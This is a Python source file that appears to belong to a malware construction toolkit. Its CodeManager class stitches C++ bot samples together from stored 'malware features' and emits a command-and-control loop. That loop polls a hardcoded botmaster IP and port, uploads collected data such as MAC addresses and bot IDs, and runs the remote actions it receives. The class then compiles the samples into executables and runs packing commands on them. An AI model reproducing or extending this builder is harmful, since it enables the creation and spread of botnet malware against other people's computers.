import os
import subprocess
import datetime
import re
import SourceCode
# toolkit_path = getcwd() + '\malware_toolkit'
# sys.path.insert(0, toolkit_path)
import DAO
import MalwareFeatures
import random, string

def generateBotID():
    return ''.join(random.choice(string.ascii_uppercase + \
                                 string.ascii_lowercase + \
                                 string.digits) for _ in range(32))

class CodeManager:
    'Class for managing source code'
    buildOutputFile = 'build.log'
    sourceCodeDirectory = 'malware_compiler\\source_files\\'
    buildDirectory = 'static\\compiled_samples\\'
    date_fmt = '%m_%d_%Y_%H_%M_%S'

    def __init__(self):
        self.sourceCodeObj = SourceCode.SourceCode()
        self.currentBotID = generateBotID()
        self.compilerArgs = []
        self.addedFeatures = []
        self.botActionHandler = []
        self.botLoopIncluded = False
        self.postCompileCommands = []
        self.botMasterIP = '70.61.16.8'
        self.botMasterPort = '50000'

    def start_basic_bot_sample(self):
        self.sourceCodeObj.add_imports('#include <iostream>')

        # standard includes every sample with bot capabilities needs
        self.sourceCodeObj.add_imports('#include "lib\HttpLib.h"')
        self.sourceCodeObj.add_imports('#include "lib\\UtilLib.h"')
        self.sourceCodeObj.add_imports('#include "lib\ActionController.h"')
        self.sourceCodeObj.add_imports('#include "lib\DataCollector.h"')
        self.sourceCodeObj.add_imports('#include "lib\ThreadController.h"')

        # self.sourceCodeObj.add_func_imports('#include "lib\ConditionHandlers.h"')
        self.sourceCodeObj.add_global_variable('char *BOT_ID = \"' + self.currentBotID + '\";')
        self.sourceCodeObj.add_global_variable('DataCollector dc;')
        self.sourceCodeObj.add_global_variable('vector<vector<string>> requestQueue;')
        # the define checking is put on one line so things done get messed up
        # when checking for repeated entries is done
        self.sourceCodeObj.add_global_variable('#if defined(THREADING)\nThreadController tc;\n#endif')
        self.sourceCodeObj.add_global_variable('#ifdef ENCODE_HTTP\nbool encode = true;\n' + \
                                               '#else\nbool encode = false;\n#endif')

        # if there is bot functionality, MacAddress and Bot id will need to be in the vectors
        self.sourceCodeObj.add_cond_check_to_main('#if defined(BOTLOOP) || defined(EXECUTE)')
        self.sourceCodeObj.add_cond_check_to_main('char* MAC_ADDR = getMAC();')
        self.sourceCodeObj.add_cond_check_to_main('dc.addDataPair("bot_id", BOT_ID);')
        self.sourceCodeObj.add_cond_check_to_main('dc.addDataPair("mac_address", MAC_ADDR);')
        self.sourceCodeObj.add_cond_check_to_main('#endif')

        # add code to clean up threads, if any thread related code is addedFeatures
        self.sourceCodeObj.add_to_end_of_main('#if defined THREADING')
        self.sourceCodeObj.add_to_end_of_main('tc.closeAllThreads();')
        self.sourceCodeObj.add_to_end_of_main('#endif')

        self.compilerArgs.append('lib\ConditionHandlers.cpp')
        self.compilerArgs.append('lib\HttpLib.cpp')
        self.compilerArgs.append('lib\\UtilLib.cpp')
        self.compilerArgs.append('lib\ActionController.cpp')
        self.compilerArgs.append('lib\DataCollector.cpp')
        self.compilerArgs.append('lib\ThreadController.cpp')

    def setBotPullTimes(self, times):
        timesString = 'const int TIMEARRAY[] = {'
        i = 0
        # loop over the array of times ints, converting them to a c++ array string
        if len(times) > 1:
            while i < len(times) - 1:
                timesString = timesString + str(times[i]) + ', '
                i = i + 1
            timesString = timesString + str(times[len(times)-1])
        else:
            timesString = timesString + str(times[0])
        timesString = timesString + '};'
        self.sourceCodeObj.add_global_variable(timesString)
        self.sourceCodeObj.add_global_variable('#define TIME_CHECK')

    def setActionLimit(self, limit):
        countString = "int COUNT = " + limit + ";"
        self.sourceCodeObj.add_global_variable(countString)
        self.sourceCodeObj.add_global_variable('#define REQ_COUNT')

    def setActionFrequency(self, freq):
        freqString = "int WAIT = " + freq + ";"
        self.sourceCodeObj.add_global_variable(freqString)
        self.sourceCodeObj.add_global_variable('#define FREQUENCY')

    def setBotmasterIP(self, ip):
        self.botMasterIP = ip

    def setBotmasterPort(self, port):
        self.botMasterPort = port

    def generateBotPullLoop(self):
        loop = []
        loop.append('#ifdef BOTLOOP')
        loop.append('string response = "";')
        loop.append('struct Action action;')
        loop.append('ac.addAction(action);')
        loop.append('int reqCounter = 0;')
        loop.append('while(1){')
        loop.append('#if defined(TIME_CHECK) && defined(REQ_COUNT)')
        loop.append('\tif (waitForTime(TIMEARRAY, sizeof(TIMEARRAY), COUNT)){')
        loop.append('#endif')
        loop.append('\t\tresponse = sendG_Request(url, port, "/database/api/connect_in/", requestQueue, dc.getGetData());')
        loop.append('\t\taction = ac.parseAction(response);')
        loop.append('\t\tac.addAction(action);')
        loop.append('\t\thandleAction();')
        loop.append('\t\treqCounter++;')
        loop.append('\t\tSleep(3000);')
        loop.append('\t\tif(reqCounter % 5 == 0){')
        loop.append('\t\t\tsendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData());')
        loop.append('\t\t\tdc.dumpCollectedData();')
        loop.append('\t\t}')
        loop.append('#ifdef FREQUENCY')
        loop.append('waitForPeriod(WAIT);')
        loop.append('#endif')
        loop.append('#if defined(TIME_CHECK) && defined(REQ_COUNT)')
        loop.append('\t}')
        loop.append('#endif')
        loop.append('}')
        loop.append('#endif')
        return loop


    def generateActionHandlerFunction(self):
        handler = []
        handler.append('void handleAction(){')
        handler.append('struct Action action;')
        handler.append('while(ac.hasAction()){')
        handler.append('action = ac.getNextAction();')
        handler.append('printf("action %s\\n", action.action.c_str());')
        for l in self.botActionHandler:
            handler.append(str(l))
        handler.append('action = ac.getNextAction();')
        handler.append('}') #close while
        handler.append('}') #close function
        return handler

    def addActionHandlerStatement(self, statement):
        for line in statement:
            self.botActionHandler.append(line)

    def createActionParseStatement(self, feature_name, feature_body):
        statement = []
        statement.append('if(action.action == "' + feature_name + '"){')
        statement.append('printf("doing action %s\\n", action.action.c_str());')
        for l in feature_body:
            statement.append(l)
        statement.append('}')
        return statement

    # generates the command line argument to build the sample
    def generateCompilerCommand(self, exe_file_name, source_file_name):
        buildCmd = 'cl /Fe' + self.buildDirectory + exe_file_name + ' ' \
            + (self.sourceCodeDirectory + source_file_name)
        for c in self.compilerArgs:
            buildCmd += ' ' + self.sourceCodeDirectory + c
        return buildCmd

    # accesses the database to create a MalwareFeature object that can be
    # used by the sourcecode class to assemble a .cpp
    def create_feature_object(self, feature):
        feat = DAO.get_python_feature_obj(feature)
        i = 0
        # iterate over every function name in the list and get a python object
        # for that function, replace the list element with this object
        while i < len(feat['functions']):
            feat['functions'][i] = DAO.get_python_function_obj(feat['functions'][i])
            i += 1

        malwareFeat = MalwareFeatures.MalwareFeature()
        malwareFeat.add_imports(feat['imports'])
        malwareFeat.add_global_variables(feat['globals'])

        for func in feat['functions']:
            if len(func['imports']) > 0:
                malwareFeat.add_imports(func['imports'])
            if len(func['globals']) > 0:
                malwareFeat.add_global_variables(func['globals'])
            malwareFeat.add_func_declarations(func['header'])
            malwareFeat.add_func_definitions(func['definition'])

        malwareFeat.add_feat_body(feat['body'])
        malwareFeat.set_feat_priority(feat['priority'])
        malwareFeat.set_feat_name(feat['name'])
        return malwareFeat

    # adds header, defition and function call to the source code object
    # feature_obj is an object of the class MalwareFeature
    def add_malware_feature(self, feature_obj, feat_type):
        print("adding feature " + feature_obj.name)
        if feat_type == 'Execution Conditions':
            self.sourceCodeObj.add_cond_check_to_main(feature_obj.get_feat_body())
        if feat_type == 'Options':
            self.sourceCodeObj.add_option_to_main(feature_obj.get_feat_body())
        if feat_type == 'On Execution':
            self.sourceCodeObj.add_to_main(feature_obj.get_feat_body())
            self.sourceCodeObj.add_global_variable(["#define EXECUTE"])
            if feature_obj.get_name() not in self.addedFeatures:
                parseStatement = self.createActionParseStatement(feature_obj.get_name(), feature_obj.get_feat_body())
                self.addActionHandlerStatement(parseStatement)
        if feat_type == 'As Remote Action':
            self.sourceCodeObj.add_global_variable(["#define BOTLOOP"])
            if not self.botLoopIncluded:
                loop = self.generateBotPullLoop()
                self.sourceCodeObj.add_global_variable('ActionController ac;')
                self.sourceCodeObj.add_botnet_to_main(loop)
            self.botLoopIncluded = True
            if feature_obj.get_name() not in self.addedFeatures:
                parseStatement = self.createActionParseStatement(feature_obj.get_name(), feature_obj.get_feat_body())
                self.addActionHandlerStatement(parseStatement)
        if feature_obj.name not in self.addedFeatures:
            self.sourceCodeObj.add_imports(feature_obj.get_imports())
            self.sourceCodeObj.add_global_variable(feature_obj.get_global_variables())
            # self.sourceCodeObj.add_func_declaration(feature_obj.get_func_declarations(), feature_obj.get_func_definitions())
            self.sourceCodeObj.add_func_declaration(feature_obj.get_func_declarations())
            self.sourceCodeObj.add_func_definition(feature_obj.get_func_definitions())
            self.addedFeatures.append(feature_obj.name)

    # add a condition features
    # this type of features will go at the top of main,
    # checking conditions before running
    def add_condition_check_feature(self, feature_obj):
        # if feature_obj.name not in self.addedFeatures:
        #     print("not adding " + feature_obj.name)
        self.sourceCodeObj.add_func_imports(feature_obj.get_func_imports())
        self.sourceCodeObj.add_global_variable(feature_obj.get_global_variables())
        # self.sourceCodeObj.add_func_declaration(feature_obj.get_func_declarations(), feature_obj.get_func_definitions())
        self.sourceCodeObj.add_func_declaration(feature_obj.get_func_declarations())
        self.sourceCodeObj.add_func_definition(feature_obj.get_func_definitions())
        self.addedFeatures.append(feature_obj.name)
        self.sourceCodeObj.add_cond_check_to_main(feature_obj.get_feat_body())

    # add an option features
    # lines that go at the top of main but not as important
    # adding start-up process for example
    def add_option_feature(self, feature_obj):
        # if feature_obj.name not in self.addedFeatures:
        #     print("not adding " + feature_obj.name)
        self.sourceCodeObj.add_func_imports(feature_obj.get_func_imports())
        self.sourceCodeObj.add_global_variable(feature_obj.get_global_variables())
        # self.sourceCodeObj.add_func_declaration(feature_obj.get_func_declarations(), feature_obj.get_func_definitions())
        self.sourceCodeObj.add_func_declaration(feature_obj.get_func_declarations())
        self.sourceCodeObj.add_func_definition(feature_obj.get_func_definitions())
        self.addedFeatures.append(feature_obj.name)
        self.sourceCodeObj.add_option_to_main(feature_obj.get_feat_body())

    # add an action feature
    # actions that are forces on execution but not in the botnet loop
    def add_action_feature(self, feature_obj):
        # if feature_obj.name not in self.addedFeatures:
        #     print("not adding " + feature_obj.name)
        self.sourceCodeObj.add_func_imports(feature_obj.get_func_imports())
        # self.sourceCodeObj.add_global_variable(feature_obj.get_global_variables(), feature_obj.get_func_declarations())
        self.sourceCodeObj.add_func_declaration(feature_obj.get_func_declarations())
        self.sourceCodeObj.add_func_definition(feature_obj.get_func_definitions())
        self.addedFeatures.append(feature_obj.name)
        self.sourceCodeObj.add_to_main(feature_obj.get_feat_body())

    # add action feature to botnet loop
    # actions that will go in the botnet loop
    def add_botnet_feature(self, feature_obj):
        self.sourceCodeObj.add_func_imports(feature_obj.get_func_imports())
        self.sourceCodeObj.add_global_variable(feature_obj.get_global_variables(), feature_obj.get_func_declarations())
        # self.sourceCodeObj.add_func_declaration(feature_obj.get_func_declarations())
        self.sourceCodeObj.add_func_definition(feature_obj.get_func_definitions())
        self.addedFeatures.append(feature_obj.name)
        self.sourceCodeObj.add_botnet_to_main(feature_obj.get_feat_body())

    # adds a line that will be run on the command line after the sample has been compiled
    # this is used for packing
    def add_post_compile_command(self, line):
        self.postCompileCommands.append(line)

    # prints build results to a file specified in the global scope
    # output_filename - the file to open and write the output to
    # buid_cmd - the commmand that was executed
    # build_output - the results of the command
    def log_build_results(self, output_filename, build_cmd, build_err, build_out):
        output_log = open(output_filename, 'a')
        output_log.write('--------------------------------------------------\n')
        date = datetime.datetime.now().date()
        time = datetime.datetime.now().time()
        output_log.write('Time: ' + str(date) + ' ' + str(time) + '\n')
        output_log.write("Build Command: " + str(build_cmd) + '\n')
        output_log.write(str(build_err))
        output_log.write('Build Error:\n' + str(build_out) + '\n')
        output_log.write('--------------------------------------------------\n')
        output_log.close()

    # calls g++ to build the source file into an executable
    # source_file_name - the name of the source code file
    def build_executable(self, source_file_name):
        # add the ActionHandler, since we know nothing else will be added at this point
        if self.botLoopIncluded == True:
            handler = self.generateActionHandlerFunction()
            # self.sourceCodeObj.add_func_declaration('void handleAction();\n', handler)
            self.sourceCodeObj.add_func_declaration('void handleAction();\n')
            self.sourceCodeObj.add_func_definition(handler)
        # now is also a safe time to set the bot ip and port since they will no longer be changed
        self.sourceCodeObj.add_global_variable('string url = \"' + self.botMasterIP + '\";')
        self.sourceCodeObj.add_global_variable('int port = ' + self.botMasterPort + ';')

        # 0: success, -1: failure
        buildRes = -1
        botID = -1
        date = datetime.datetime.now()
        exe_file_name = date.strftime(self.date_fmt) + '.exe'

        # have the sourceCodeObj export the code to a file
        if os.path.isfile(self.sourceCodeDirectory + source_file_name):
            os.remove(self.sourceCodeDirectory + source_file_name)
        self.sourceCodeObj.export_code(self.sourceCodeDirectory + source_file_name)
        # check if the sourceCode File exist first
        if os.path.isfile(self.sourceCodeDirectory + source_file_name):
            # build the command line string
            buildCmd = self.generateCompilerCommand(exe_file_name, source_file_name)
            # buildCmd = 'g++ -o ' + exe_file_name + ' ' + source_file_name
            proc = subprocess.Popen(buildCmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            (stdout, stderr) = proc.communicate()

            # since 'cl' always outputs some copyright text to stderr, and actual
            # check if the exe exists to determine if the build was a success
            if os.path.isfile(self.buildDirectory + exe_file_name):
                print("Build Successful")
                # return the path to the exe so the user can download it
                buildRes = self.buildDirectory + '\\' + exe_file_name
                botID = self.currentBotID

                # if there are any commands to call after the compiler is done, this is where packing will be called
                for cmdLine in self.postCompileCommands:
                    cmdLine = re.sub(r'\{\{exe_name\}\}', buildRes, cmdLine)
                    proc = subprocess.Popen(cmdLine, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    (stdout, stderr) = proc.communicate()
            else:
                print("Build Failed")
                self.log_build_results(self.buildOutputFile, buildCmd, stderr, stdout)
                buildRes = -1

            # clear source code state, whether build was successful or not
            # so it is ready for the next build
            self.sourceCodeObj.clearState()
        else:
            print("Source code file does not exist")
            buildRes = -1
        return [buildRes, botID]
